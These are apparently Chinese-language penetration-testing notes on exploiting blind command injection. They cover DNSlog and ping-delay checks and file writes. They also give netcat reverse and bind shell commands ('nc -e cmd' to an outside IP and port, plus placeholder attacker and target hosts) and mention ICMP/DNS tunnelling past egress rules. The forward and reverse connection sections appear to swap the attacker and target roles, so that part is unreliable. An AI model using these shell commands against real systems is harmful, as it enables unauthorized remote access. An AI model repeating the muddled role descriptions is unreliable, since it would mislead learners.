## 数据不回显

代码层面函数调用问题

*判断是不是数据不回显并且有漏洞 有漏洞如何得到数据*

## 判断是否有漏洞

1 数据带外 

*DNSlog TCP-Portlog ICMP-Sizelog*

解析DNS地址，产看解析日志，有日志解析记录

2 延迟判断

发包看回显时间

*Win ping -n 3 127.0.0.1
Linux ping -c 3 127.0.0.1*

3 写访问文件

写静态文件或写可访问文件确定

棱角社区 https://forum.ywhack.com/shell.php
反弹shell技巧总结 https://cloud.tencent.com/developer/article/1906240

4 反弹权限

判定目标系统 利用反弹命令反弹目标系统权限

*nc -e cmd 119.45.254.149 7777
nc -lvp 7777*

5 其他 根据环境

文件下载(反连的意义)

## 数据不出网
、
入站方向 客户端传送数据给服务端方向
出站方向 服务端传送数据给客户端方向

不出网就是安全组规则把出站做了限制

流程
1 判断出入限制
2判断出入限制的端口和协议
3 分析援引用正向还是反向隧道

***攻击机 1.1.1.1
靶机 2.2.2.2
攻击端口 8899***
### 正向连接

本地监听等待对方连接

攻击机 *nc -e cmd -lvvp 8899* *绑定cmd到本地ip8899端口*
靶机 *nc 1.1.1.1 8899* *主动连接目标8899*

### 反向连接

靶机监听，攻击机连接

攻击机 *nc -e cmd 2.2.2.2 8899* *绑定cmd到目标ip8899端口*
靶机 *nc -lvvp 8899* *等待8899连接*

**开启出战策略，采用其他协议隧道 *ICMP，DNS等隧道技术*  







